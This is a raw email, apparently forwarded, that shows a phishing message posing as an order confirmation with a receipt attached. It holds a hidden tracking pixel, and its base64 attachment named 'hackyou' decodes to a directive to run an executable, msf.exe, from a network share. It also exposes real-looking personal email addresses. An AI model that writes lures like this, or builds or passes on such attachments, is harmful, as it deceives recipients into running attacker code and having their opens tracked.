Delivered-To: hz_khedri@esi.dz
Received: by 2002:a05:6918:6627:b0:c6:d418:c049 with SMTP id p39csp1962888ysr;
        Fri, 1 Jul 2022 16:00:43 -0700 (PDT)
X-Received: by 2002:a5d:5608:0:b0:21b:88a0:d260 with SMTP id l8-20020a5d5608000000b0021b88a0d260mr17145748wrv.359.1656716442951;
        Fri, 01 Jul 2022 16:00:42 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1656716442; cv=none;
        d=google.com; s=arc-20160816;
        b=gHrh6uUwicOZY/ix3BNkAC6rhhuzb/uVvuweVa0s3nCkaObGci0N+w6HmwtNpIk1Eb
         8d3pmi30/ni4OO86NEn7Gp7yS8MowKBFtyNdSTI5iXq9pchNzdiV50iXgoSn1AVzW5TC
         hCin1e8ZfazfoVRF17nsWg9XA668GFEmWc/A0dipakkQ85zHzV7gPiumu3ajnnRb72fm
         00BaIg+n/DJDaWtiv4+ZgRzCc0yd0Fd9D4iS3yysnZ8VE1vQDU/5s0E01KgoROX2kDtL
         dmZ8KdMu8NFI613oAULDSrVcDNa9o8LWpGTZU5EHpI+pC1m1jys+TMXNeG2TyssPd5+q
         TRtg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :dkim-signature;
        bh=87QXx6ZrxuPgBs9qR/HyIlNBLVHGwgGkQhskl4Le7tM=;
        b=D6B/1hQqakPJcGf3yOVJSUZdq8JCzg4Wh8UEAOoe6UHNRAaCXXE4yVNIUI31/B0FS9
         pCDPQDRAye+gI5zUv+lov1okgnIJA27L9EO31Y8ngthH0WyJ7WJ5tvpZx1f/cuLSdCMT
         fSsJkrcrefNBbOXvsUEn3wgJUA+reRW90ln9OWWUFzMKYeVHcX6aMxiV4koxEM5FrXkG
         uyHtzGWLbDOxE/mJsMqBBS8GezEOoKqAgJJHSfQMqeUA2Y0gsW8bVuk4I4GLgz8TWm2n
         ET+XRCk6szWTtTIlgFh5ncBSRmEkrHJEJSYscKAGm1qw+Vp5skFOczWIMtBJv3iRUh/V
         QEqQ==
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@gmail.com header.s=20210112 header.b=VOI2qElu;
       spf=pass (google.com: domain of itachibatna@gmail.com designates 209.85.220.41 as permitted sender) smtp.mailfrom=itachibatna@gmail.com;
       dmarc=pass (p=NONE sp=QUARANTINE dis=NONE) header.from=gmail.com
Return-Path: <itachibatna@gmail.com>
Received: from mail-sor-f41.google.com (mail-sor-f41.google.com. [209.85.220.41])
        by mx.google.com with SMTPS id e2-20020adfdbc2000000b0020d0bf69a94sor10983642wrj.59.2022.07.01.16.00.42
        for <hz_khedri@esi.dz>
        (Google Transport Security);
        Fri, 01 Jul 2022 16:00:42 -0700 (PDT)
Received-SPF: pass (google.com: domain of itachibatna@gmail.com designates 209.85.220.41 as permitted sender) client-ip=209.85.220.41;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@gmail.com header.s=20210112 header.b=VOI2qElu;
       spf=pass (google.com: domain of itachibatna@gmail.com designates 209.85.220.41 as permitted sender) smtp.mailfrom=itachibatna@gmail.com;
       dmarc=pass (p=NONE sp=QUARANTINE dis=NONE) header.from=gmail.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=87QXx6ZrxuPgBs9qR/HyIlNBLVHGwgGkQhskl4Le7tM=;
        b=VOI2qEluXfrW7GY0IMOVmPGCxB6mU75Az7pbtHODEv9fG5wAArLdnucwnNnW01LjAZ
         3zWesW2QGNVRLcOdEBrFHzfAKjgFqqeX/wCRKSiBUR3QuF2giWHcfM46SEWk4vft8u2a
         ShXXD54DE0n++f3JesalJIgk72JHlD7n3Hk7Z1xPrVRl1dow+v3DWdCt6g3VaaxaF4XE
         robUbUVcHRqRHqAU4m3lXI3kCcTCnwdTmAKD7tL31MRIbKR1x5dpIm6ZFDwH+o3uG4ze
         o6hicc7MvpEUVCtuvIuCIIua99i6mgNhH8tinjLw5TDi3sMRxZ438q8qjYXO5wY9ixFt
         ntcg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=87QXx6ZrxuPgBs9qR/HyIlNBLVHGwgGkQhskl4Le7tM=;
        b=hXesrp+7UnV6hrKGllXWe9vmvBdIFsTKUBjiSDrJSgax40BQ2aSMZ63R5NJW1UhRPc
         Eri/fJNb5nM4gYOtmLuQXLvzSQ1wrzLn8sLMzw5iqgd5MdRvdqan726cvRNiho/BlbV2
         nCDBimwecBNgYWs3Vl9m/uIt4M+/msJN7iWjGMBYXx3+7oJBW2olNJY5S7J7bgoqaC9b
         vLaTq5eUu84TVFEhfvrk8KiHNVoIKFf/UpTnsFK9nsW63kNZxFvzGRjNbIM1AV9uAF/c
         OwSNMsDs/yASY1BY/NRD+D27SgrAU7VYwOftiy3YV9AXXusnPDVcrpLeKcW7kPz6tLrX
         k17A==
X-Gm-Message-State: AJIora819Eh4xNheuzymcHwVfuQJ3UYO9xQ8pXQq/0PQyWzlcfZxFQ1w
	BC6w+kP3T88m/ztPDKLT6pcLj1rgwre8QTJv+2zYX0cMV6nDmw==
X-Google-Smtp-Source: AGRyM1t7LXNjh0bDfiEnDsfPk723VPnDWiHYcCjnWCaLb8KQkv3UghcXZOnjsijTCcMxbDhsE5di9GR/T5wpDaCqkxY=
X-Received: by 2002:a5d:52d0:0:b0:21d:3626:6cc3 with SMTP id
 r16-20020a5d52d0000000b0021d36266cc3mr11371701wrv.334.1656716441923; Fri, 01
 Jul 2022 16:00:41 -0700 (PDT)
MIME-Version: 1.0
References: <1ca76e0e-eadc-4f3e-b65f-0c19625ac17e@smtp-relay.sendinblue.com>
In-Reply-To: <1ca76e0e-eadc-4f3e-b65f-0c19625ac17e@smtp-relay.sendinblue.com>
From: Turkey new <itachibatna@gmail.com>
Date: Sat, 2 Jul 2022 00:00:30 +0100
Message-ID: <CADbJjUHEmGhcoPcp4VxYaZYT0E-GGoUoTTHTfQiYfARgB9umdQ@mail.gmail.com>
Subject: Fwd: Order Confirmation
To: hz_khedri@esi.dz
Content-Type: multipart/mixed; boundary="00000000000004534105e2c65b57"

--00000000000004534105e2c65b57
Content-Type: multipart/alternative; boundary="00000000000004533e05e2c65b55"

--00000000000004533e05e2c65b55
Content-Type: text/plain; charset="UTF-8"

---------- Forwarded message ---------
From: HACKER ONE <hackerone@zino.com>
Date: Wed, 29 Jun 2022 at 19:14
Subject: Order Confirmation
To: <itachibatna@gmail.com>


Hello,
Attached you will find your receipt for the order that you placed. Please
be aware that it may take 2-3 business days for items to be shipped.
It has been a pleasure to have your business.

Thank you
Jim Woznaky

--00000000000004533e05e2c65b55
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><br><br><div class=3D"gmail_quote"><div dir=3D"ltr" class=
=3D"gmail_attr">---------- Forwarded message ---------<br>From: <strong cla=
ss=3D"gmail_sendername" dir=3D"auto">HACKER ONE</strong> <span dir=3D"auto"=
>&lt;<a href=3D"mailto:hackerone@zino.com">hackerone@zino.com</a>&gt;</span=
><br>Date: Wed, 29 Jun 2022 at 19:14<br>Subject: Order Confirmation<br>To: =
 &lt;<a href=3D"mailto:itachibatna@gmail.com">itachibatna@gmail.com</a>&gt;=
<br></div><br><br>Hello, <br> Attached you will find your receipt for the o=
rder that you placed. Please be aware that it may take 2-3 business days fo=
r items to be shipped. <br> It has been a pleasure to have your business. <=
br>  <br> Thank you <br>  Jim Woznaky <br> <br><img width=3D"1" height=3D"1=
" src=3D"https://eigjeac.r.af.d.sendibt2.com/tr/op/m8iL6MrXAWHlIwGJKi42tN9t=
FvdInkU-kxGdvLLt9omG58Ec2qG1rojEhz77AJhVFX6FYvSTEOoM0R5KFLWLhbgWBOidmYCiSo2=
OK2_W1lQ4uSe2FRWRJO7K8SL7qXq0Cwj-GoVB5o0_uXVOzsDLJD57Qyj91M6q9j_-32sZ6zpE" =
alt=3D""><br></div></div>

--00000000000004533e05e2c65b55--
--00000000000004534105e2c65b57
Content-Type: application/octet-stream; name=hackyou
Content-Disposition: attachment; filename=hackyou
Content-Transfer-Encoding: base64
Content-ID: <181bbfe55c928b3b55e1>
X-Attachment-Id: 181bbfe55c928b3b55e1

PGFwcGxpY2F0aW9uIHJ1bj0iXFwwLjAuMC4wXGhocWlFXG1zZi5leGUiIC8+
--00000000000004534105e2c65b57--
